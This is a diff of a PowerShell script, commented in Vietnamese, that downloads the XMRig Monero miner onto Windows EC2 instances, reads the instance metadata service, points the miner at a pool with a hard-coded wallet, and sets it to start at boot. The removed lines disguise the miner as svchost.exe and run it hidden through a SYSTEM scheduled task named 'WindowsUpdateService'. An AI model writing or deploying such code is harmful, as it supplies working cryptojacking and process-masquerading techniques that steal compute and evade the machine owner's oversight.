@@ -1,9 +1,6 @@
 # Bật logging để debug
 Start-Transcript -Path C:\Windows\Temp\setup.log -Append
 
-# Lấy thông tin tên vùng của EC2
-$region = (Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/placement/region)
-
 # Tạo thư mục làm việc
 $workDir = "C:\Windows\Temp\xmrig"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
@@ -15,10 +12,10 @@ Invoke-WebRequest -Uri $xmrigUrl -OutFile "$workDir\xmrig.zip"
 Expand-Archive -Path "$workDir\xmrig.zip" -DestinationPath $workDir -Force
 Remove-Item "$workDir\xmrig.zip"
 
-# Đổi tên file để ẩn danh
-Rename-Item -Path "$workDir\xmrig.exe" -NewName "svchost.exe"
+# Cấu hình XMRig với Worker Name động (theo EC2 Instance ID)
+$instanceID = (Invoke-RestMethod -Uri http://169.254.169.254/latest/meta-data/instance-id)
+$workerName = "Worker-$instanceID"
 
-# Cấu hình tệp config với tên Worker động
 $xmrigConfig = @"
 {
     "autosave": true,
@@ -28,7 +25,7 @@ $xmrigConfig = @"
     "pools": [
         {
             "url": "xmr-eu.kryptex.network:7029",
-            "user": "88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV.Win",
+            "user": "88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV.$workerName",
             "keepalive": true,
             "tls": false
         }
@@ -37,15 +34,12 @@ $xmrigConfig = @"
 "@
 $xmrigConfig | Out-File -Encoding utf8 "$workDir\config.json"
 
-# Ẩn tiến trình XMRig bằng cách đổi tên
-$taskName = "WindowsUpdateService"
-$exePath = "$workDir\svchost.exe"
+# Chạy XMRig ngay lập tức (hiện cửa sổ)
+Start-Process -FilePath "$workDir\xmrig.exe" -ArgumentList "--config=$workDir\config.json"
 
-# Tạo task tự động chạy khi khởi động
-schtasks /Create /TN $taskName /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "$exePath --config=$workDir\config.json" /F
-
-# Chạy XMRig ngay lập tức
-Start-Process -FilePath $exePath -ArgumentList "--config=$workDir\config.json" -WindowStyle Hidden
+# Thêm XMRig vào Startup để tự chạy khi bật máy
+$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $runKey -Name "XMRig" -Value "$workDir\xmrig.exe --config=$workDir\config.json"
 
 # Tắt logging
 Stop-Transcript
